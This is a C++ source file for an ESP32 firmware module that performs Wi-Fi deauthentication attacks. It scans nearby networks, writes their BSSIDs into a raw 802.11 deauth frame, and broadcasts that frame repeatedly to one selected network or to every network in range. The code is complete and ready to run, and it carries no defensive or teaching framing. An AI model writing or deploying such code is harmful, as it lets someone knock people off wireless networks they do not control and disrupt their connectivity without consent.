#include "wifi_deauth.h"

static uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

WiFiDeauthModule wifiDeauth;

void WiFiDeauthModule::init() {
    active = false;
    networkCount = 0;
    frameCount = 0;
    currentTarget = -1;
    logger.log(LOG_INFO, "DEAUTH", "WiFi Deauth module ready");
}

int WiFiDeauthModule::scanNetworks() {
    WiFi.scanDelete();
    int n = WiFi.scanNetworks();
    networkCount = (n > 20) ? 20 : n;
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        networks[i].selected = false;
    }
    WiFi.scanDelete();
    logger.log(LOG_INFO, "DEAUTH", ("Found " + String(networkCount) + " networks").c_str());
    return networkCount;
}

void WiFiDeauthModule::startDeauth(int targetIdx) {
    if (targetIdx < 0 || targetIdx >= networkCount) return;
    currentTarget = targetIdx;
    active = true;
    frameCount = 0;
    lastFrame = 0;
    logger.log(LOG_INFO, "DEAUTH", ("Deauth on: " + networks[targetIdx].ssid).c_str());
    buzzer.beep(1000, 100);
}

void WiFiDeauthModule::startDeauthAll() {
    currentTarget = -1;
    active = true;
    frameCount = 0;
    lastFrame = 0;
    logger.log(LOG_INFO, "DEAUTH", "Deauth ALL started");
    buzzer.beep(1000, 100);
}

void WiFiDeauthModule::stopDeauth() {
    active = false;
    logger.log(LOG_INFO, "DEAUTH", ("Deauth stopped. Frames: " + String(frameCount)).c_str());
    buzzer.click();
}

bool WiFiDeauthModule::isActive() { return active; }
unsigned long WiFiDeauthModule::getFrameCount() { return frameCount; }

void WiFiDeauthModule::sendDeauthFrame(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&deauthPacket[4], bssid, 6);
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    deauthPacket[24] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
    frameCount++;
}

void WiFiDeauthModule::update() {
    if (!active) return;
    if (millis() - lastFrame < DEAUTH_FRAME_DELAY) return;
    lastFrame = millis();

    if (currentTarget >= 0) {
        sendDeauthFrame(networks[currentTarget].bssid, networks[currentTarget].channel);
    } else {
        for (int i = 0; i < networkCount; i++) {
            sendDeauthFrame(networks[i].bssid, networks[i].channel);
        }
    }
}

WiFiNetwork* WiFiDeauthModule::getNetworks() { return networks; }
int WiFiDeauthModule::getNetworkCount() { return networkCount; }